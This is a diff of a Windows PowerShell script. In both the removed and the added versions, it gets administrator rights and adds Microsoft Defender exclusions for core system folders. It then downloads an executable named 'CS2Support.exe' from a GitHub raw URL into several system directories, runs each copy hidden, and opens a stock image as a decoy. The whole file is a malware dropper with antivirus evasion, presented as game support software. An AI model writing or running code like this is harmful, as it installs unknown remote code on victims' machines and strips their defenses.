@@ -1,28 +1,25 @@
-# Ensure the script runs as administrator
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process -FilePath "powershell" -ArgumentList "-Command & {Start-Process -FilePath 'powershell' -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File ""$PSCommandPath""' -Verb RunAs}" -Verb RunAs
-    exit
-}
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Users\Public\Downloads\CS2Support.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\System32\CS2Support.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\CS2Support.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\CS2Support.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
 
-# Add exclusions
-$paths = @('C:\ProgramData', 'C:\Users\Public\Downloads', 'C:\Windows\System32', 'C:\Windows\SysWOW64', 'C:\Windows')
-foreach ($path in $paths) {
-    Add-MpPreference -ExclusionPath $path
-}
-Add-MpPreference -ExclusionExtension 'CS2Support.exe'
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Users\Public\Downloads\CS2Support.exe'"
+Start-Process "C:\Users\Public\Downloads\CS2Support.exe" -WindowStyle Hidden
 
-# Download and execute files
-$locations = @(
-    'C:\Users\Public\Downloads\CS2Support.exe',
-    'C:\Windows\System32\CS2Support.exe',
-    'C:\Windows\SysWOW64\CS2Support.exe',
-    'C:\Windows\CS2Support.exe'
-)
 
-foreach ($location in $locations) {
-    Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile $location
-    Start-Process $location -WindowStyle Hidden
-}
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\System32\CS2Support.exe'"
+Start-Process "C:\Windows\System32\CS2Support.exe" -WindowStyle Hidden
 
-# Open the webpage
-Start-Process "https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg"
+
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\SysWOW64\CS2Support.exe'"
+Start-Process "C:\Windows\SysWOW64\CS2Support.exe" -WindowStyle Hidden
+
+
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\CS2Support.exe'"
+Start-Process "C:\Windows\CS2Support.exe" -WindowStyle Hidden
+start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
